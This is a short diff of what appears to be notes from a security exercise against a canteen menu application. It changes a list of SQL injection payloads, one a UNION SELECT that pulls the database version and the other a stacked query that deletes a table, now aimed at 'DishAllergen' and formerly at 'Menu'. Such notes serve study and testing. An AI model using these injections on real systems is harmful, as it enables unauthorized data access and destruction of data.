@@ -12,4 +12,4 @@ Canteen Menu:
 2020-01-01' UNION SELECT 0, version(), '$10.00';--
 
 Delete Tables:
-';DELETE FROM Menu;--
+';DELETE FROM DishAllergen;--
